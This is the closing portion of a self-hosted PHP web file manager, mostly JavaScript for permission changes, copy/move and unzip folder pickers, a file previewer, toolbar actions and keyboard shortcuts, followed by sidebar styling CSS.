        modal('Change Permissions: '+esc(n),'<div class="form-group"><label class="form-label">Permission Mode</label><select id="fmChmodMode" class="form-control"><option value="0644">0644 — Owner RW, Group R, Others R</option><option value="0755">0755 — Owner RWX, Group RX, Others RX</option><option value="0600">0600 — Owner RW only</option><option value="0700">0700 — Owner RWX only</option><option value="0664">0664 — Owner RW, Group RW, Others R</option><option value="0775">0775 — Owner/Group RWX, Others RX</option><option value="0777">0777 — Full access</option><option value="custom">Custom octal…</option></select></div><div id="fmChmodCustomWrap" style="display:none" class="form-group"><label class="form-label">Custom Mode</label><input id="fmChmodCustom" class="form-control" inputmode="numeric" maxlength="4" placeholder="0644"></div><div class="form-text">Linux permissions in octal. Example: <b>0644</b> or <b>0755</b>.</div>','<button class="btn btn-light" onclick="closeModal()">Cancel</button><button class="btn btn-primary" onclick="doChmod('+esc(js(p))+')"><i class="fas fa-key"></i> Apply</button>');
        setTimeout(()=>{const s=$('fmChmodMode'),w=$('fmChmodCustomWrap');if(s){s.value=defaultMode;s.onchange=()=>{w.style.display=s.value==='custom'?'block':'none';if(s.value==='custom')$('fmChmodCustom')?.focus()};}},30);
      }
      async function doChmod(p){try{const s=$('fmChmodMode');let mode=s&&s.value==='custom'?($('fmChmodCustom')?.value||''):s?.value||'0644';mode=mode.trim();if(!/^[0-7]{3,4}$/.test(mode))throw Error('Invalid mode. Use 3 or 4 octal digits.');if(mode.length===3)mode='0'+mode;const r=await api('chmod',{path:p,mode});closeModal();toast('Permissions changed to '+(r.mode||mode));await load();}catch(e){toast(e.message||'chmod failed')}}
      async function deletePaths(paths){
        paths=[...new Set(paths||[])].filter(Boolean);
        if(!paths.length)return toast('Select item(s)');
        if(!confirm('Delete '+paths.length+' selected item(s)?'))return;
        try{await api('delete',{paths});state.selected.clear();toast('Deleted '+paths.length+' item(s)');await load();}
        catch(e){toast(e.message||'Delete failed');}
      }
      
      function deleteSelected(){deletePaths([...state.selected])}
      let pickerState={action:'copy',paths:[],dir:'/'};
      async function openTransferPicker(action,paths){
        pickerState={action,paths:Array.isArray(paths)?paths:[paths],dir:state.dir};
        modal(action==='copy'?'Copy to…':'Move to…','<div id="transferPicker"></div>','<button class="btn btn-light" onclick="closeModal()">Cancel</button>',false);
        await renderTransferPicker();
      }
      async function renderTransferPicker(){
        const box=$('transferPicker'); if(!box)return;
        try{
          const d=await api('list',{dir:pickerState.dir,_picker:String(Date.now())});
          const folders=(d.items||[]).filter(x=>x.type==='folder');
          box.innerHTML=`<div class="fm-picker"><div class="fm-picker-bar"><button type="button" class="btn btn-light" id="pickerUp" title="Up"><i class="fas fa-arrow-up"></i></button><div class="fm-picker-path">${esc(pickerState.dir)}</div><button type="button" class="btn btn-primary" id="pickerUse">Use this folder</button></div><div class="fm-picker-list">${folders.length?folders.map(x=>`<button type="button" class="fm-picker-item" data-picker-dir="${esc(x.fullPath)}"><i class="fas fa-folder"></i><span>${esc(x.name)}</span></button>`).join(''):'<div class="fm-picker-empty">No subfolders here</div>'}</div><div class="fm-picker-create"><input id="pickerNewFolder" class="form-control" placeholder="New folder name"><button type="button" class="btn btn-light" id="pickerCreateFolder"><i class="fas fa-folder-plus"></i> Create</button></div></div><div class="fm-picker-use"><span class="fm-picker-hint">Click a folder to open it, then choose “Use this folder”.</span><span class="fm-picker-hint">${pickerState.paths.length} item(s)</span></div>`;
          $('pickerUse').onclick=()=>finishTransfer(pickerState.dir);
          $('pickerCreateFolder').onclick=async()=>{const n=$('pickerNewFolder').value.trim();if(!n)return toast('Enter a folder name');try{await api('mkdirPath',{parent:pickerState.dir,name:n});await renderTransferPicker();toast('Folder created');}catch(e){toast(e.message)}};
          $('pickerNewFolder').onkeydown=e=>{if(e.key==='Enter')$('pickerCreateFolder').click()};
          $('pickerUp').onclick=()=>{if(pickerState.dir!=='/'){const parts=pickerState.dir.split('/').filter(Boolean);parts.pop();pickerState.dir='/'+parts.join('/');if(pickerState.dir!=='/'&&pickerState.dir.endsWith('/'))pickerState.dir=pickerState.dir.slice(0,-1);renderTransferPicker();}};
          box.querySelectorAll('[data-picker-dir]').forEach(b=>b.onclick=()=>{pickerState.dir=b.dataset.pickerDir;renderTransferPicker();});
        }catch(e){box.innerHTML='<div class="fm-empty">'+esc(e.message||'Unable to load folders')+'</div>';}
      }
      async function finishTransfer(dest){
        try{
          await api(pickerState.action,{paths:pickerState.paths,destDir:dest});
          closeModal();state.selected.clear();toast((pickerState.action==='copy'?'Copied ':'Moved ')+pickerState.paths.length+' item(s)');await load();
        }catch(e){toast(e.message||'Transfer failed');}
      }
      function transferOne(action,p){openTransferPicker(action,[p]);}
      function copySelected(){const p=[...state.selected];if(!p.length)return toast('Select item(s)');openTransferPicker('copy',p)}
      function moveSelected(){const p=[...state.selected];if(!p.length)return toast('Select item(s)');openTransferPicker('move',p)}
      async function doTransfer(a,p){openTransferPicker(a,[p]);}
      
      let dragPath=null;function dragStart(e,p){dragPath=p;e.dataTransfer.effectAllowed='move';e.dataTransfer.setData('text/plain',p)}function dragOver(e,p,t){if(t==='folder'){e.preventDefault();e.currentTarget.classList.add('drag-over')}}async function dropTo(e,p,t){e.preventDefault();e.currentTarget.classList.remove('drag-over');if(t!=='folder'||!dragPath)return;try{await api('move',{oldPath:dragPath,destDir:p});dragPath=null;state.selected.clear();load()}catch(x){toast(x.message)}}
      function unzipOne(p,n){
        pickerState={action:'unzip',paths:[p],dir:state.dir};
        modal('Unzip: '+n,'<div id="transferPicker"></div>','<button class="btn btn-light" onclick="closeModal()">Cancel</button>',false);
        renderUnzipPicker();
      }
      async function renderUnzipPicker(){
        const box=$('transferPicker');if(!box)return;
        try{
          const d=await api('list',{dir:pickerState.dir,_picker:String(Date.now())});
          const folders=(d.items||[]).filter(x=>x.type==='folder');
          box.innerHTML=`<div class="fm-picker"><div class="fm-picker-bar"><button type="button" class="btn btn-light" id="pickerUp" title="Up"><i class="fas fa-arrow-up"></i></button><div class="fm-picker-path">${esc(pickerState.dir)}</div><button type="button" class="btn btn-primary" id="pickerUse">Unzip here</button></div><div class="fm-picker-list">${folders.length?folders.map(x=>`<button type="button" class="fm-picker-item" data-picker-dir="${esc(x.fullPath)}"><i class="fas fa-folder"></i><span>${esc(x.name)}</span></button>`).join(''):'<div class="fm-picker-empty">No subfolders here</div>'}</div><div class="fm-picker-create"><input id="pickerNewFolder" class="form-control" placeholder="New folder name"><button type="button" class="btn btn-light" id="pickerCreateFolder"><i class="fas fa-folder-plus"></i> Create</button></div></div><div class="fm-picker-use"><span class="fm-picker-hint">Choose a folder, then click “Unzip here”.</span></div>`;
          $('pickerUse').onclick=()=>finishUnzip(pickerState.dir);
          $('pickerCreateFolder').onclick=async()=>{const n=$('pickerNewFolder').value.trim();if(!n)return toast('Enter a folder name');try{await api('mkdirPath',{parent:pickerState.dir,name:n});await renderUnzipPicker();toast('Folder created');}catch(e){toast(e.message)}};
          $('pickerNewFolder').onkeydown=e=>{if(e.key==='Enter')$('pickerCreateFolder').click()};
          $('pickerUp').onclick=()=>{if(pickerState.dir!=='/'){const parts=pickerState.dir.split('/').filter(Boolean);parts.pop();pickerState.dir='/'+parts.join('/');renderUnzipPicker();}};
          box.querySelectorAll('[data-picker-dir]').forEach(b=>b.onclick=()=>{pickerState.dir=b.dataset.pickerDir;renderUnzipPicker();});
        }catch(e){box.innerHTML='<div class="fm-empty">'+esc(e.message||'Unable to load folders')+'</div>';}
      }
      async function finishUnzip(dest){
        try{const r=await api('unzip',{path:pickerState.paths[0],destDir:dest});closeModal();toast(r.message||'Unzipped successfully');await load();}
        catch(e){toast(e.message||'Unzip failed');}
      }
      async function doUnzip(p){await finishUnzip(pickerState.dir);}
      
      function directLink(p,t='file'){
        try{
          p=String(p||'/').replace(/\\/g,'/');
          const parts=p.split('/').filter(Boolean).map(encodeURIComponent);
          let url=location.origin+'/'+parts.join('/');
          if(t==='folder'&&!url.endsWith('/'))url+='/';
          const w=window.open(url,'_blank','noopener,noreferrer');
          if(!w) toast('Popup blocked. Allow pop-ups for this site.');
        }catch(e){toast('Unable to open direct link')}
      }
      function fileKind(x){
        if(!x||x.type!=='file')return '';
        const e=(x.extension||'').toLowerCase();
        if(e==='zip')return 'zip';
        // V67 — extensionless/dotfiles such as .htaccess, .env, LICENSE, README are previewable as text.
        if(!e)return 'text';
        const base=String(x.name||'').toLowerCase();
        if(['.htaccess','.htpasswd','.env','.env.local','.env.production','.env.development','.gitignore','.gitattributes','.dockerignore','.editorconfig','.npmrc','.yarnrc','.yarnrc.yml','.prettierrc','.eslintrc','.babelrc'].includes(base))return 'text';
        if(['jpg','jpeg','png','gif','webp','svg','bmp','ico','avif'].includes(e))return 'image';
        if(['mp4','webm','ogg','ogv','mov','m4v'].includes(e))return 'video';
        if(['mp3','wav','oga','m4a','aac','flac'].includes(e))return 'audio';
        if(e==='pdf')return 'pdf';
        if(['txt','md','markdown','csv','json','xml','yml','yaml','log','ini','conf','config','env','htaccess','htpasswd','gitignore','dockerignore','editorconfig','npmrc','sql','js','mjs','cjs','css','scss','sass','less','html','htm','php','phtml','py','sh','bash','zsh','fish','rb','go','java','kt','kts','c','cpp','h','hpp','cc','hh','rs','swift','lua','pl','pm','r','toml','properties','service','socket','target','list','rules'].includes(e))return 'text';
        // Unknown extensions are also offered File Viewer. The server still rejects binary data safely.
        return 'text';
      }
      function directFileUrl(p,t='file'){
        p=String(p||'/').replace(/\\/g,'/');
        const parts=p.split('/').filter(Boolean).map(encodeURIComponent);
        let url=location.origin+'/'+parts.join('/');
        if(t==='folder'&&!url.endsWith('/'))url+='/';
        return url;
      }
      async function viewFile(p,n){
        try{
          const x=state.items.find(i=>i.fullPath===p)||{type:'file',name:n,extension:(String(n).split('.').pop()||'')};
          const kind=fileKind(x);
          if(!kind)return toast('Preview is not available for this file type.');
          const url=directFileUrl(p,'file');
          let body='';
          if(kind==='image')body=`<div class="fm-viewer-media image"><img src="${esc(url)}" alt="${esc(n||x.name)}"></div>`;
          else if(kind==='video')body=`<div class="fm-viewer-media"><video controls autoplay playsinline src="${esc(url)}"></video></div>`;
          else if(kind==='audio')body=`<div class="fm-viewer-media audio"><i class="fas fa-volume-high"></i><audio controls autoplay src="${esc(url)}"></audio></div>`;
          else if(kind==='pdf')body=`<div class="fm-viewer-media pdf"><iframe src="${esc(url)}" title="${esc(n||x.name)}"></iframe></div>`;
          else if(kind==='zip'){
            const r=await api('zipInfo',{path:p});
            const fmtBytes=v=>{v=Number(v||0);if(v<1024)return v+' B';const u=['KB','MB','GB','TB'];let i=-1;do{v/=1024;i++;}while(v>=1024&&i<u.length-1);return v.toFixed(v<10?2:1)+' '+u[i];};
            const fmtDate=ts=>ts?new Date(Number(ts)*1000).toLocaleString():'-';
            const decodeName=b64=>{try{const bin=atob(b64||'');const bytes=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);try{return new TextDecoder('utf-8',{fatal:true}).decode(bytes)}catch(_){return new TextDecoder('windows-1252').decode(bytes)}}catch(_){return '[Invalid filename]'}};
            const entries=r.entries||[];
            const rows=entries.map((it,idx)=>{const nm=decodeName(it.name_b64);const depth=Math.max(0,nm.split('/').filter(Boolean).length-1);const label=nm.endsWith('/')?nm.replace(/\/$/,''):nm;return `<div class="fm-zip-entry ${it.folder?'folder':''}" style="--zip-depth:${depth}"><i class="fas ${it.folder?'fa-folder':'fa-file'}"></i><span title="${esc(nm)}">${esc(label)}</span>${it.folder?'':`<small>${fmtBytes(it.size)}</small>`}</div>`}).join('');
            body=`<div class="fm-archive-viewer"><div class="fm-zip-entries">${rows||'<div class="fm-zip-empty">Archive is empty</div>'}</div></div>`;
          }
          else {
            const r=await api('view',{path:p});
            let content=r.content||'';
            if(r.encoding==='base64'){
              const bin=atob(content);
              const bytes=new Uint8Array(bin.length);
              for(let i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);
              try{
                content=new TextDecoder('utf-8',{fatal:true}).decode(bytes);
              }catch(_){
                content=new TextDecoder('windows-1252').decode(bytes);
              }
            }
            body=`<div class="fm-viewer-text"><pre>${esc(content)}</pre></div>`;
          }
          const viewerFooter=kind==='zip'?`<div class="fm-viewer-footer-left"><button class="btn btn-light" onclick="unzipOne(${esc(js(p))},${esc(js(n||x.name))});"><i class="fas fa-file-zipper"></i> Unzip</button></div><div class="fm-viewer-footer-right"><button class="btn btn-primary" onclick="directLink(${esc(js(p))},'file')"><i class="fas fa-external-link-alt"></i> Open in new tab</button><button class="btn btn-light" onclick="closeModal()">Close</button></div>`:`<div class="fm-viewer-footer-right"><button class="btn btn-primary" onclick="directLink(${esc(js(p))},'file')"><i class="fas fa-external-link-alt"></i> Open in new tab</button><button class="btn btn-light" onclick="closeModal()">Close</button></div>`;
          modal('File Viewer — '+(n||x.name),body,viewerFooter,false);
          $('modalContent').classList.add('fm-file-viewer-modal');
        }catch(e){toast(e.message||'Unable to preview file');}
      }
      function fileAction(a,p,n,t,m){
        try{
          if(a==='direct-link'){ directLink(p,t); }
          else if(a==='view'){ if(t!=='file') return; viewFile(p,n); }
          else if(a==='zip'){ if(t!=='folder'&&t!=='file') return; createZip(p,n); }
          else if(a==='downloadzip'){ if(t!=='folder') return; downloadZip(p); }
          else if(a==='unzip'){ if(t!=='file') return; unzipOne(p,n); }
          else if(a==='edit'){ if(t!=='file') return toast('Select a file'); editOne(p,n); }
          else if(a==='download'){ if(t!=='file') return toast('Only files can be downloaded here'); downloadOne(p); }
          else if(a==='rename'){ renameOne(p,n); }
          else if(a==='copy'){ transferOne('copy',p); }
          else if(a==='move'){ transferOne('move',p); }
          else if(a==='touch'){ touchOne(p,n,t,m); }
          else if(a==='chmod'){ chmodOne(p,n,t); }
          else if(a==='delete'){ deletePaths([p]); }
        }catch(x){toast(x.message||'Action failed')}
      }
      function openFolderFromRow(p){ go(p); }
      function navigateFolder(p){if(!p)return;go(p);}
      
      function updatePrimaryToolbar(){
        const b=$('toolbarPrimaryAction');if(!b)return;
        const selected=[...state.selected];
        let mode='edit',label='Edit',icon='fa-edit',title='Edit selected file';
        if(selected.length>=2){mode='bulkzip';label='Bulk ZIP';icon='fa-file-archive';title='Create one ZIP from selected items';}
        else if(selected.length===1){
          const x=state.items.find(i=>i.fullPath===selected[0]);
          if(x){
            if(x.type==='folder'){mode='zip';label='ZIP';icon='fa-file-archive';title='Create ZIP from selected folder';}
            else if(x.type==='file' && (x.extension||'').toLowerCase()==='zip'){mode='unzip';label='UNZIP';icon='fa-file-zipper';title='Unzip selected ZIP file';}
            else if(x.type==='file'){mode='edit';label='Edit';icon='fa-edit';title='Edit selected file';}
          }
        }
        b.dataset.primaryMode=mode;b.title=title;b.innerHTML='<i class="fas '+icon+'"></i> '+label;
        const enabled=selected.length>=1;
        b.disabled=!enabled;
        b.style.opacity=enabled?'1':'.65';
        b.style.cursor=enabled?'pointer':'not-allowed';
      }
      function primaryToolbarAction(){
        if(state.selected.size>=2){return bulkZipSelected();}
        const p=one();if(!p)return;
        const x=state.items.find(i=>i.fullPath===p);if(!x)return;
        if(x.type==='folder')return createZip(p,x.name);
        if(x.type==='file' && (x.extension||'').toLowerCase()==='zip')return unzipOne(p,x.name);
        if(x.type==='file')return editOne(p,x.name);
      }
      async function bulkZipSelected(){const paths=[...state.selected];if(paths.length<2)return toast('Select at least 2 files or folders');const name='bulk-'+new Date().toISOString().replace(/[-:TZ.]/g,'').slice(0,14)+'.zip';try{const r=await api('bulkZip',{paths:JSON.stringify(paths),destDir:state.dir,name});toast(r.message||'Bulk ZIP created');await load();}catch(e){toast(e.message||'Bulk ZIP failed')}}
      function fmAction(a,e){
        if(e){e.preventDefault();e.stopPropagation();}
        try{
          if(a==='home')go('/');else if(a==='terminal')openTerminal();else if(a==='upload')openUpload('files');else if(a==='uploadzip')openUpload('zip');else if(a==='newfolder')openNewFolder();else if(a==='newfile')openNewFile();else if(a==='refresh')refreshFiles();else if(a==='selectall')selectAll();else if(a==='theme')toggleTheme();else if(a==='toggleview')setView(!state.grid);else if(a==='reset')resetSettings();else if(a==='listview')setView(false);else if(a==='gridview')setView(true);else if(a==='edit')primaryToolbarAction();else if(a==='download')downloadSelected();else if(a==='copy')copySelected();else if(a==='move')moveSelected();else if(a==='delete')deleteSelected();else if(a==='sidebar')toggleSidebar();
        }catch(x){toast(x.message||'Action failed')}
        return false;
      }
      function bindToolbarActions(){
        // Actions are handled by the document-level dispatcher below.
      }
      function fmAction(a,e){
        if(e){e.preventDefault();e.stopPropagation();}
        try{
          switch(a){
            case 'home': go('/'); break;
            case 'terminal': openTerminal(); break;
            case 'currentfile': {
              // Return to the folder that contains the running File Manager PHP script.
              // Example: /tester/filemanager.php -> ?home=%2Ftester
              const currentUrl = new URL(<?=json_encode($FM_SCRIPT_URL,JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE)?>, window.location.href);
              let scriptDir = currentUrl.pathname.substring(0, currentUrl.pathname.lastIndexOf('/'));
              if (!scriptDir) scriptDir = '/';
              if (scriptDir.length > 1) scriptDir = scriptDir.replace(/\/+$/, '');
              currentUrl.search = '';
              if (scriptDir === '/') currentUrl.searchParams.delete('home');
              else currentUrl.searchParams.set('home', scriptDir);
              window.location.href = currentUrl.toString();
              break;
            }
            case 'upload': openUpload('files'); break;
            case 'uploadzip': openUpload('zip'); break;
            case 'newfolder': openNewFolder(); break;
            case 'newfile': openNewFile(); break;
            case 'refresh': refreshFiles(); break;
            case 'selectall': selectAll(); break;
            case 'theme': toggleTheme(); break;
            case 'toggleview': setView(!state.grid); break;
            case 'reset': resetSettings(); break;
            case 'listview': setView(false); break;
            case 'gridview': setView(true); break;
            case 'edit': primaryToolbarAction(); break;
            case 'download': downloadSelected(); break;
            case 'copy': copySelected(); break;
            case 'move': moveSelected(); break;
            case 'delete': deleteSelected(); break;
            case 'sidebar': toggleSidebar(); break;
          }
        }catch(x){toast(x.message||'Action failed');}
        return false;
      }
      document.addEventListener('dblclick',e=>{
        const target=e.target.closest('.fm-row,.fm-card');
        if(!target || e.defaultPrevented)return;
        if(e.target.closest('.fm-actions,.folder-chevron,.fm-check,.fm-chevron'))return;
        const p=target.dataset.path,t=target.dataset.rowType;if(!p)return;
        e.preventDefault();e.stopPropagation();
        if(t==='folder'){go(p);return;}
        if(t==='file'){
          const nm=target.querySelector('.fm-name span')?.textContent||target.querySelector('[title]')?.textContent||p.split('/').pop();
          editOne(p,nm);
        }
      },true);
      document.addEventListener('click',e=>{
        if(e.defaultPrevented)return;
        const fileActionEl=e.target.closest('[data-file-action]');
        if(fileActionEl){e.preventDefault();e.stopPropagation();fileAction(fileActionEl.dataset.fileAction,fileActionEl.dataset.path,fileActionEl.dataset.name||fileActionEl.closest('.fm-row')?.querySelector('.fm-name span')?.textContent||'',fileActionEl.closest('.fm-row')?.dataset.rowType||'file');return;}
        const actionEl=e.target.closest('[data-fm-action]');
        if(actionEl){e.preventDefault();e.stopPropagation();const a=actionEl.dataset.fmAction;try{fmAction(a,e);}catch(x){toast(x.message||'Action failed')}return;}
        const check=e.target.closest('[data-check-path]');
        if(check){e.preventDefault();e.stopPropagation();toggle(check.dataset.checkPath);return;}
        const chevron=e.target.closest('[data-folder-toggle]');
        if(chevron){e.preventDefault();e.stopPropagation();toggleFolder(e,chevron.dataset.folderToggle);return;}
        const row=e.target.closest('.fm-row,.fm-card');
        if(row && !e.target.closest('.fm-actions,.folder-chevron,.fm-check')){
          const p=row.dataset.path,t=row.dataset.rowType;
          if(e.ctrlKey||e.metaKey){toggle(p);return;}
          if(t==='parent'){go(p);return;}
          if(t==='folder'){go(p);return;}
          state.selected.clear();state.selected.add(p);render();
        }
      });
      document.addEventListener('keydown',e=>{
        const advancedActive=!!$('editorSurface')&&$('editorSurface').classList.contains('advanced-mode')&&$('modal').classList.contains('show');
        const editorHasFocus=advancedActive && editor && editor.hasFocus && editor.hasFocus();
        if(editorHasFocus&&(e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='f'){
          e.preventDefault();e.stopPropagation();openAdvancedSearch(false);return;
        }
        if(editorHasFocus&&(e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='h'){
          e.preventDefault();e.stopPropagation();openAdvancedSearch(true);return;
        }
        if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='u'){e.preventDefault();openUpload('files');return;}
        if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='s'&&editor){e.preventDefault();saveEditor();return;}
        if(e.key==='F2'&&!['INPUT','TEXTAREA'].includes(e.target.tagName)){e.preventDefault();const p=one();if(p){const x=state.items.find(i=>i.fullPath===p);renameOne(p,x?.name||'')}return;}
        if(e.key==='Delete'&&!['INPUT','TEXTAREA'].includes(e.target.tagName)){e.preventDefault();deleteSelected();return;}
        if(e.key==='Escape'&&$('modal').classList.contains('show'))closeModal();
      });
      $('searchInput').addEventListener('input',render);
      window.addEventListener('popstate',e=>{const u=new URL(location.href);const p=u.searchParams.get('home')||'/';state.dir=p;state.selected.clear();state.expanded.clear();$('searchInput').value='';load();});
      applyTheme();setView(state.grid);bindToolbarActions();load();
    </script>
    <?php endif; ?>
    <style id="fm-v54-sidebar-polish">
      /* V51 — hovered preview row must sit above every sibling row so filenames/folders never paint over the thumbnail. */
      .fm-row:hover{
        z-index:1000!important;
      }
      .fm-row:hover .fm-name{
        z-index:1001!important;
      }
      .fm-row:hover .fm-hover-preview{
        z-index:1002!important;
      }
      
      /* V54 — align every sidebar icon and label on a clean vertical grid. */
      .sidebar-nav .nav-item{
        gap:.78rem;
        padding-left:.78rem;
        padding-right:.78rem;
        min-height:42px;
      }
      .sidebar-nav .nav-item > i{
        width:20px;
        min-width:20px;
        flex:0 0 20px;
        text-align:center;
        line-height:1;
      }
      .sidebar-nav .nav-item > span{
        display:block;
        min-width:0;
        padding-left:0;
        line-height:1.2;
      }
      
      /* V55 — remove subgroup text labels and keep a clean divider before file tools. */
      .sidebar-nav .quick-access-section .nav-item[data-fm-action="upload"]{
        margin-top:.8rem;
        padding-top:1rem;
        border-top:1px solid rgba(255,255,255,.08);
        border-radius:0;
      }
      
      /* Section headings get a consistent inset and rhythm all the way down to Preferences. */
      .sidebar-nav .nav-section-title{
        padding-left:.78rem;
        padding-right:.78rem;
      }
      .sidebar-nav .nav-section{
        margin-bottom:1.75rem;
      }
      .sidebar-nav .quick-access-section{
        margin-bottom:1.55rem;
      }
      
      /* Keep the Current File quick-access item visually consistent with the other navigation actions. */
      .nav-item[data-fm-action="currentfile"] i{color:#3498db;}
      
      /* The logout item follows the same icon/text alignment grid. */
      .sidebar-logout{
        gap:.78rem;
      }
      .sidebar-logout i{
        width:20px;
        min-width:20px;
        text-align:center;
      }
    </style>
  </body>

</html>
